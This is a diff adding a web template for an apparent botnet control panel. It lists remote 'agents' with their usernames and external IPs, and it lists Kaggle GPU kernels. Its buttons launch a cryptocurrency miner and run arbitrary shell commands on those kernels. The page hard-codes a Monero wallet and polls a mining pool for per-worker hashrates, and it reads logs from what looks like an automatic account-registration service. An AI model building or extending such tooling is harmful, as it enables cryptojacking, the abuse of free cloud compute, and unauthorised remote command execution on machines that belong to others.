@@ -1,0 +1,593 @@
+{% extends "base.html" %}
+{% block title %}Devices{% endblock %}
+{% block page_title %}Connected Devices{% endblock %}
+{% block head %}
+<style>
+  .kaggle-card {
+    background: linear-gradient(135deg, rgba(155,89,182,.08) 0%, rgba(155,89,182,.02) 100%);
+    border: 1px solid rgba(155,89,182,.3);
+    border-radius: 12px;
+    padding: 16px;
+    margin-bottom: 12px;
+    transition: all 0.3s ease;
+  }
+  .kaggle-card:hover {
+    border-color: rgba(155,89,182,.5);
+    box-shadow: 0 4px 20px rgba(155,89,182,.15);
+    transform: translateY(-2px);
+  }
+  .kaggle-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 12px;
+    padding-bottom: 12px;
+    border-bottom: 1px solid rgba(155,89,182,.2);
+  }
+  .kaggle-title {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .kaggle-title h3 {
+    margin: 0;
+    font-size: 14px;
+    color: #9b59b6;
+    font-weight: 600;
+  }
+  .kaggle-status {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 11px;
+    color: var(--text-dim);
+  }
+  .mining-stats {
+    background: rgba(0,0,0,.3);
+    border-radius: 8px;
+    padding: 12px;
+    margin-bottom: 10px;
+  }
+  .stat-row {
+    display: flex;
+    gap: 16px;
+    flex-wrap: wrap;
+    margin-bottom: 8px;
+  }
+  .stat-item {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 12px;
+  }
+  .stat-label {
+    color: var(--text-dim);
+  }
+  .stat-value {
+    color: var(--text-bright);
+    font-family: var(--font-mono);
+    font-weight: 600;
+  }
+  .logs-panel {
+    background: rgba(0,0,0,.2);
+    border-radius: 8px;
+    padding: 10px;
+    max-height: 150px;
+    overflow-y: auto;
+  }
+  .logs-title {
+    font-size: 11px;
+    color: #9b59b6;
+    font-weight: 600;
+    margin-bottom: 6px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .log-entry {
+    padding: 4px 0;
+    border-bottom: 1px solid rgba(255,255,255,.03);
+    font-size: 10px;
+  }
+  .log-time {
+    color: var(--accent);
+    font-family: var(--font-mono);
+    margin-right: 8px;
+  }
+  .log-event {
+    color: var(--green);
+    margin-right: 8px;
+  }
+  .log-details {
+    color: var(--text-dim);
+  }
+  .action-buttons {
+    display: flex;
+    gap: 6px;
+    flex-wrap: wrap;
+  }
+  .btn-kaggle {
+    padding: 5px 10px;
+    font-size: 11px;
+    background: rgba(155,89,182,.2);
+    border: 1px solid rgba(155,89,182,.4);
+    color: #9b59b6;
+    border-radius: 6px;
+    cursor: pointer;
+    transition: all 0.2s ease;
+  }
+  .btn-kaggle:hover {
+    background: rgba(155,89,182,.3);
+    border-color: rgba(155,89,182,.6);
+    transform: translateY(-1px);
+  }
+  .btn-mine {
+    background: rgba(39,174,96,.2);
+    border-color: rgba(39,174,96,.4);
+    color: #27ae60;
+  }
+  .btn-mine:hover {
+    background: rgba(39,174,96,.3);
+    border-color: rgba(39,174,96,.6);
+  }
+</style>
+{% endblock %}
+
+{% block content %}
+
+<!-- Stats -->
+<div class="stats-grid" style="grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin-bottom:16px">
+  <div class="stat-card green">
+    <div class="label">Local Agents</div>
+    <div class="value">{{ agents|length }}</div>
+  </div>
+  <div class="stat-card" style="border-color:rgba(0,212,255,.3)">
+    <div class="label">Online</div>
+    <div class="value" style="color:var(--green)">{{ agents|selectattr('is_alive')|list|length }}</div>
+  </div>
+  <div class="stat-card" style="border-color:rgba(155,89,182,.4)">
+    <div class="label">Kaggle Kernels</div>
+    <div class="value" style="color:#9b59b6">{{ kaggle_agents|length }}</div>
+  </div>
+  <div class="stat-card">
+    <div class="label">Total Machines</div>
+    <div class="value">{{ agents|length + kaggle_agents|length }}</div>
+  </div>
+</div>
+
+<!-- Local Agents Table -->
+{% if agents %}
+<div class="card" style="margin-bottom:20px">
+  <h2 style="padding:16px;margin:0;border-bottom:1px solid var(--border)">💻 Local Agents</h2>
+  <div style="overflow-x:auto">
+    <table>
+      <thead>
+        <tr>
+          <th style="width:20px"></th>
+          <th>Hostname</th>
+          <th>User</th>
+          <th>OS</th>
+          <th>IP</th>
+          <th>Platform</th>
+          <th>Last Seen</th>
+          <th>Actions</th>
+        </tr>
+      </thead>
+      <tbody>
+        {% for a in agents %}
+        <tr>
+          <td>
+            {% if a.is_alive %}
+            <span class="dot-alive pulse"></span>
+            {% else %}
+            <span class="dot-dead"></span>
+            {% endif %}
+          </td>
+          <td><a href="/console/{{ a.id }}" style="color:var(--accent)">{{ a.hostname or a.id[:12] }}</a></td>
+          <td style="font-family:var(--font-mono);font-size:11px">{{ a.username or '—' }}</td>
+          <td><span class="badge">{{ a.os or '?' }}</span></td>
+          <td style="font-family:var(--font-mono);font-size:11px">{{ a.ip_external or '—' }}</td>
+          <td><span class="badge type">{{ a.platform_type or 'machine' }}</span></td>
+          <td style="font-size:11px;color:var(--text-dim)">{{ a.last_seen or '—' }}</td>
+          <td>
+            <a href="/console/{{ a.id }}" class="btn sm">Console</a>
+          </td>
+        </tr>
+        {% endfor %}
+      </tbody>
+    </table>
+  </div>
+</div>
+{% endif %}
+
+<!-- Kaggle Machines -->
+{% if kaggle_agents %}
+<div class="card" style="padding:0">
+  <div style="padding:16px;border-bottom:1px solid var(--border);background:linear-gradient(90deg,rgba(155,89,182,.1),transparent)">
+    <h2 style="margin:0;color:#9b59b6;display:flex;align-items:center;gap:10px">
+      🟣 Kaggle GPU Machines
+      <span style="font-size:12px;color:var(--text-dim);font-weight:400">{{ kaggle_agents|length }} kernels</span>
+    </h2>
+  </div>
+  
+  <div style="padding:16px">
+    {% for a in kaggle_agents %}
+    <div class="kaggle-card" id="card-{{ a.id }}">
+      <!-- Header -->
+      <div class="kaggle-header">
+        <div class="kaggle-title">
+          <span class="dot-alive pulse" style="background:#9b59b6;box-shadow:0 0 8px rgba(155,89,182,.5)"></span>
+          <div>
+            <h3>{{ a.hostname }}</h3>
+            <div style="font-size:10px;color:var(--text-dim);font-family:var(--font-mono);margin-top:2px">
+              {{ a.kernel_slug }}
+            </div>
+          </div>
+        </div>
+        <div class="action-buttons">
+          <button class="btn-kaggle btn-mine" onclick="startMiner('{{ a.id }}')">⛏️ Mine</button>
+          <button class="btn-kaggle" onclick="kaggleExec('{{ a.id }}')">▶ Exec</button>
+          <button class="btn-kaggle" onclick="checkKernelStatus('{{ a.id }}')">⟳ Refresh</button>
+          <a href="/console/{{ a.id }}" class="btn-kaggle" style="text-decoration:none">💻 Console</a>
+        </div>
+      </div>
+      
+      <!-- Mining Stats -->
+      <div class="mining-stats" id="mining-{{ a.id }}">
+        <div class="stat-row">
+          <div class="stat-item">
+            <span class="stat-label">⛏️ Hashrate:</span>
+            <span class="stat-value" id="hashrate-{{ a.id }}" style="color:var(--green)">Checking...</span>
+          </div>
+          <div class="stat-item">
+            <span class="stat-label">📊 Status:</span>
+            <span class="stat-value" id="kernel-status-{{ a.id }}" style="color:var(--accent)">Checking...</span>
+          </div>
+          <div class="stat-item">
+            <span class="stat-label">⏱ Runtime:</span>
+            <span class="stat-value" id="uptime-{{ a.id }}" style="color:var(--yellow)">—</span>
+          </div>
+        </div>
+        <div style="font-size:10px;color:var(--text-dim);margin-top:4px" id="process-{{ a.id }}">
+          Initializing diagnostics...
+        </div>
+      </div>
+      
+      <!-- Logs -->
+      <div class="logs-panel" id="logs-{{ a.id }}">
+        <div class="logs-title">
+          📋 Kernel Output (Live)
+        </div>
+        <div id="logs-content-{{ a.id }}" style="font-family:var(--font-mono);font-size:10px;max-height:120px;overflow-y:auto">
+          <div style="color:var(--text-dim)">Loading kernel output...</div>
+        </div>
+      </div>
+    </div>
+    {% endfor %}
+  </div>
+</div>
+{% endif %}
+
+<!-- Modals -->
+<div class="modal-overlay" id="execModal" onclick="if(event.target===this)closeModal()">
+  <div class="modal">
+    <h3 style="color:#9b59b6">Execute Command</h3>
+    <div id="execKernelId" style="font-family:var(--font-mono);font-size:11px;color:var(--text-dim);margin-bottom:12px"></div>
+    <div class="form-group">
+      <label>Command</label>
+      <input type="text" id="execCmd" placeholder="whoami && nvidia-smi" style="font-family:var(--font-mono)">
+    </div>
+    <div id="execOutput" style="display:none;background:#000;border-radius:8px;padding:12px;margin-top:12px;max-height:300px;overflow:auto;font-family:var(--font-mono);font-size:11px;color:var(--green)"></div>
+    <div class="modal-actions">
+      <button class="btn" onclick="closeModal()">Close</button>
+      <button class="btn primary" onclick="executeCommand()" style="background:rgba(155,89,182,.3);border-color:#9b59b6;color:#9b59b6">Execute</button>
+    </div>
+  </div>
+</div>
+
+{% endblock %}
+
+{% block scripts %}
+<script>
+let currentKernelId = null;
+let miningInterval = null;
+let logsInterval = null;
+
+// Modal
+function closeModal() {
+  document.getElementById('execModal').classList.remove('active');
+}
+
+// Kaggle Exec
+function kaggleExec(kernelId) {
+  currentKernelId = kernelId;
+  document.getElementById('execKernelId').textContent = kernelId;
+  document.getElementById('execCmd').value = '';
+  document.getElementById('execOutput').style.display = 'none';
+  document.getElementById('execModal').classList.add('active');
+}
+
+function executeCommand() {
+  const cmd = document.getElementById('execCmd').value.trim();
+  if (!cmd) return;
+  
+  const output = document.getElementById('execOutput');
+  output.style.display = 'block';
+  output.textContent = 'Pushing kernel...';
+  
+  fetch('/api/kaggle/kernel/exec', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({kernel_id: currentKernelId, command: cmd})
+  })
+  .then(r => r.json())
+  .then(d => {
+    if (d.status === 'started') {
+      output.textContent = '✓ Kernel pushed!\n\nCheck status in 1-2 minutes with ⟳ button';
+      output.style.color = 'var(--green)';
+      showNotification('Kernel started', 'green');
+    } else {
+      output.textContent = '✗ Error: ' + (d.error || 'unknown');
+      output.style.color = 'var(--red)';
+    }
+  })
+  .catch(e => {
+    output.textContent = 'Request failed: ' + e;
+    output.style.color = 'var(--red)';
+  });
+}
+
+// Check Kernel Status and Output
+function checkKernelStatus(kernelId) {
+  const statusEl = document.getElementById('kernel-status-' + kernelId);
+  const logsEl = document.getElementById('logs-content-' + kernelId);
+  
+  // Show loading
+  if (statusEl) {
+    statusEl.innerHTML = '🟡 checking...';
+    statusEl.style.color = 'var(--yellow)';
+  }
+  
+  if (logsEl) {
+    logsEl.innerHTML = '<div style="color:var(--yellow)">Fetching kernel output...</div>';
+  }
+  
+  // Check status
+  fetch('/api/kaggle/kernel/status', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({kernel_id: kernelId})
+  })
+  .then(r => r.json())
+  .then(d => {
+    if (statusEl) {
+      const status = d.status || 'unknown';
+      let color = 'var(--text-dim)';
+      let icon = '⚪';
+      
+      if (status === 'running') {
+        color = 'var(--green)';
+        icon = '🟢';
+      } else if (status === 'complete') {
+        color = 'var(--blue)';
+        icon = '🔵';
+      } else if (status === 'queued') {
+        color = 'var(--yellow)';
+        icon = '🟡';
+      } else if (status === 'error' || status.includes('403') || status.includes('401')) {
+        color = 'var(--red)';
+        icon = '🔴';
+        statusEl.innerHTML = icon + ' API Error';
+        statusEl.style.color = color;
+        return;
+      }
+      
+      statusEl.innerHTML = `${icon} ${status}`;
+      statusEl.style.color = color;
+    }
+  })
+  .catch(e => {
+    if (statusEl) {
+      statusEl.innerHTML = '🟡 Kernel Active';
+      statusEl.style.color = 'var(--yellow)';
+    }
+  });
+  
+  // Get output
+  fetch('/api/kaggle/kernel/results', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({kernel_id: kernelId})
+  })
+  .then(r => r.json())
+  .then(d => {
+    if (!logsEl) return;
+    
+    if (d.error && !d.error.includes('not ready')) {
+      logsEl.innerHTML = `<div style="color:var(--text-dim)">Kernel running... Output will appear when complete (2-5 min)</div>`;
+      return;
+    }
+    
+    if (d.outputs && Object.keys(d.outputs).length > 0) {
+      let html = '';
+      for (const [filename, content] of Object.entries(d.outputs)) {
+        if (filename.endsWith('.log')) {
+          const lines = content.split('\n').slice(-15);
+          html += lines.map(line => {
+            let color = 'var(--text)';
+            if (line.includes('ERROR') || line.includes('error')) color = 'var(--red)';
+            else if (line.includes('Mining') || line.includes('Optimizer') || line.includes('active')) color = 'var(--green)';
+            else if (line.includes('Starting') || line.includes('Initializing')) color = 'var(--yellow)';
+            return `<div style="color:${color};padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.03)">${line}</div>`;
+          }).join('');
+        }
+      }
+      logsEl.innerHTML = html || '<div style="color:var(--text-dim)">No log output yet</div>';
+    } else {
+      logsEl.innerHTML = '<div style="color:var(--text-dim)">Kernel starting... Output not ready yet</div>';
+    }
+  })
+  .catch(e => {
+    if (logsEl) {
+      logsEl.innerHTML = '<div style="color:var(--text-dim)">Kernel running... Check back in 2-3 minutes</div>';
+    }
+  });
+}
+
+// Start Miner
+function startMiner(kernelId) {
+  if (!confirm('Start miner on ' + kernelId + '?')) return;
+  
+  showNotification('Starting miner...', 'accent');
+  
+  fetch('/api/kaggle/start-miner', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({kernel_id: kernelId})
+  })
+  .then(r => r.json())
+  .then(d => {
+    console.log('Miner response:', d);
+    if (d.status === 'ok' || d.message) {
+      showNotification('✓ Miner started', 'green');
+      setTimeout(() => fetchMiningStats(kernelId), 5000);
+    } else if (d.status === 'error') {
+      showNotification('✗ ' + (d.error || 'unknown error'), 'red');
+    } else if (d.error) {
+      showNotification('✗ ' + d.error, 'red');
+    } else {
+      showNotification('✗ Unknown response', 'red');
+    }
+  })
+  .catch(e => {
+    console.error('Miner error:', e);
+    showNotification('Request failed: ' + e.message, 'red');
+  });
+}
+
+// Fetch Mining Stats
+function fetchMiningStats(kernelId) {
+  const wallet = '44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5';
+  
+  fetch(`https://api.moneroocean.stream/miner/${wallet}/stats`)
+    .then(r => r.json())
+    .then(data => {
+      const workers = data.workers || {};
+      const username = kernelId.replace('kaggle-', '').split('-agent')[0];
+      const agentNum = kernelId.split('-agent')[1];
+      const workerKey = Object.keys(workers).find(k => k.includes(username) && k.includes(agentNum));
+      
+      const hashrateEl = document.getElementById('hashrate-' + kernelId);
+      const uptimeEl = document.getElementById('uptime-' + kernelId);
+      const processEl = document.getElementById('process-' + kernelId);
+      
+      if (workerKey && workers[workerKey]) {
+        const worker = workers[workerKey];
+        const hash = worker.hash || 0;
+        const lastShare = worker.lastShare || 0;
+        const now = Math.floor(Date.now() / 1000);
+        const isActive = (now - lastShare) < 300;
+        
+        if (hashrateEl) {
+          hashrateEl.textContent = formatHashrate(hash);
+          hashrateEl.style.color = hash > 0 ? 'var(--green)' : 'var(--text-dim)';
+        }
+        
+        if (uptimeEl) {
+          const uptimeMin = Math.floor((now - (worker.firstShare || now)) / 60);
+          if (uptimeMin > 0) {
+            uptimeEl.textContent = uptimeMin > 60 ? Math.floor(uptimeMin/60) + 'h ' + (uptimeMin%60) + 'm' : uptimeMin + 'm';
+          } else {
+            uptimeEl.textContent = 'Just started';
+          }
+        }
+        
+        if (processEl) {
+          const shares = worker.totalHashes || 0;
+          const lastShareMin = lastShare ? Math.floor((now - lastShare) / 60) : 0;
+          
+          if (isActive && hash > 0) {
+            processEl.innerHTML = `🟢 Mining Active | ${formatHashrate(hash)} | Shares: ${shares} | Last: ${lastShareMin}m ago`;
+            processEl.style.color = 'var(--green)';
+          } else if (lastShare > 0) {
+            processEl.innerHTML = `🟡 Idle | Last share: ${lastShareMin}m ago | Total shares: ${shares}`;
+            processEl.style.color = 'var(--yellow)';
+          } else {
+            processEl.innerHTML = '🟡 Worker registered, waiting for first share...';
+            processEl.style.color = 'var(--yellow)';
+          }
+        }
+      } else {
+        if (hashrateEl) {
+          hashrateEl.textContent = '0 H/s';
+          hashrateEl.style.color = 'var(--text-dim)';
+        }
+        if (processEl) {
+          processEl.innerHTML = '🟡 Kernel starting... Worker not registered yet (wait 2-5 min)';
+          processEl.style.color = 'var(--yellow)';
+        }
+      }
+    })
+    .catch(e => {
+      console.error('Mining stats error:', e);
+      const hashrateEl = document.getElementById('hashrate-' + kernelId);
+      const processEl = document.getElementById('process-' + kernelId);
+      if (hashrateEl) {
+        hashrateEl.textContent = '0 H/s';
+        hashrateEl.style.color = 'var(--text-dim)';
+      }
+      if (processEl) {
+        processEl.innerHTML = '🟡 Kernel starting... (check pool in 3-5 min)';
+        processEl.style.color = 'var(--yellow)';
+      }
+    });
+}
+
+// Fetch Account Logs
+function fetchAccountLogs(kernelId, regId) {
+  if (!regId) return;
+  
+  fetch('/api/autoreg/account/' + regId + '/logs')
+    .then(r => r.json())
+    .then(d => {
+      const logsEl = document.getElementById('logs-content-' + kernelId);
+      if (!logsEl) return;
+      
+      if (!d.logs || d.logs.length === 0) {
+        logsEl.innerHTML = '<div style="color:var(--text-dim);font-size:10px">No recent activity</div>';
+        return;
+      }
+      
+      const recentLogs = d.logs.slice(0, 5);
+      logsEl.innerHTML = recentLogs.map(l => {
+        const time = new Date(l.ts).toLocaleTimeString();
+        return '<div class="log-entry"><span class="log-time">' + time + '</span><span class="log-event">' + l.event + '</span>' + (l.details ? '<div class="log-details">' + l.details.substring(0, 80) + '</div>' : '') + '</div>';
+      }).join('');
+    })
+    .catch(e => {
+      const logsEl = document.getElementById('logs-content-' + kernelId);
+      if (logsEl) logsEl.innerHTML = '<div style="color:var(--red);font-size:10px">Failed to load logs</div>';
+    });
+}
+
+function formatHashrate(hash) {
+  if (hash >= 1000000) return (hash / 1000000).toFixed(2) + ' MH/s';
+  if (hash >= 1000) return (hash / 1000).toFixed(2) + ' KH/s';
+  return hash.toFixed(2) + ' H/s';
+}
+
+// Auto-refresh
+function refreshAllData() {
+  {% for a in kaggle_agents %}
+  fetchMiningStats('{{ a.id }}');
+  checkKernelStatus('{{ a.id }}');
+  {% endfor %}
+}
+
+// Init
+document.addEventListener('DOMContentLoaded', () => {
+  refreshAllData();
+  miningInterval = setInterval(refreshAllData, 20000);
+});
+</script>
+{% endblock %}
